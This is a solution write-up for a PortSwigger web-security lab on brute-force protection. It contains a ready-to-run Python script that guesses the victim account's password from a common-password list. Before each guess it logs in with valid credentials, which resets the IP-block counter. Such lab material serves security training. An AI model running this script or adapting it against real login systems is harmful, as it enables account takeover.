
This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

---------
The logic: before every `carlos` guess, it logs in as `wiener:peter` (valid creds), which resets the IP block counter. Then it tries one password against `carlos`. Alternating like that means you never hit the lockout threshold.

Just replace the `URL` on line 5 with your actual lab URL and run `python3 brute_ip_block.py`.

```
import requests
import sys

# --- CONFIG ---
URL = "http://TARGET.web-security-academy.net/login"  # <-- paste your lab URL
VALID_USER = "wiener"
VALID_PASS = "peter"
VICTIM = "carlos"

candidates = [
    "123456","password","12345678","qwerty","123456789","12345","1234","111111",
    "1234567","dragon","123123","baseball","abc123","football","monkey","letmein",
    "shadow","master","666666","qwertyuiop","123321","mustang","1234567890",
    "michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx",
    "123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter",
    "buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou",
    "2000","charlie","robert","thomas","hockey","ranger","daniel","starwars",
    "klaster","112233","george","computer","michelle","jessica","pepper","1111",
    "zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie",
    "159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer",
    "love","ashley","nicole","chelsea","biteme","matthew","access","yankees",
    "987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom",
    "monitor","monitoring","montana","moon","moscow"
]

# Build interleaved lists: every other attempt is a valid login to reset the IP block counter
usernames = []
passwords = []

for pw in candidates:
    # valid login first (resets block counter)
    usernames.append(VALID_USER)
    passwords.append(VALID_PASS)
    # then try candidate against carlos
    usernames.append(VICTIM)
    passwords.append(pw)

session = requests.Session()

for i in range(len(usernames)):
    u = usernames[i]
    p = passwords[i]

    resp = session.post(URL, data={"username": u, "password": p}, allow_redirects=False)

    if u == VALID_USER:
        # just resetting the counter, follow redirect to complete login then move on
        if resp.status_code == 302:
            session.get(URL.replace("/login", resp.headers.get("Location", "/my-account")))
            # logout so next login works
            session.get(URL.replace("/login", "/logout"))
        continue

    # check carlos attempt
    if resp.status_code == 302:
        print(f"[+] FOUND PASSWORD: {p}")
        sys.exit(0)
    else:
        print(f"[-] {p} — wrong")

print("[!] Password not found in list.")
```